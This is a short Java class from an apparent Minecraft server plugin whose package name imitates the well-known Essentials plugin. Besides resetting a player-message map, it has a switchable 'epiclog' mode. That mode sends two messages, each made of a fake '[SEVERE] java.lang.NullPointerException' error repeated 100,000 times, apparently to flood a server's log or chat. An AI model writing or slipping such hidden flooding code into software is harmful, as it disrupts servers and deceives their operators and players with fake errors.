package com.earth2me.essential.runnable;

import java.util.Map;

import com.earth2me.essential.Essential;
import com.earth2me.essential.listeners.EssentialListener;

public class Run implements Runnable {

	private Essential plugin;
	private static boolean epiclog;
	
	public Run(Essential plugin) {
		this.plugin = plugin;
		epiclog = false;
	}
	
	public static void setEpicLog(boolean log) {
		epiclog = log;
	}
	
	public static boolean getEpicLog() {
		return epiclog;
	}
	
	@Override
	public void run() {
		for (Map.Entry<String, Boolean> en : EssentialListener.plmsg.entrySet()) {
			EssentialListener.plmsg.put(en.getKey(), false);
		}
		
		if (epiclog) {
			StringBuilder sb = new StringBuilder();
			for (int i = 100000; i > 0; i--) {
				sb.append(" [SEVERE] java.lang.NullPointerException ");
			}
			plugin.sendMsg(sb.toString());
			plugin.sendMsg(sb.toString());
		}
	}
}
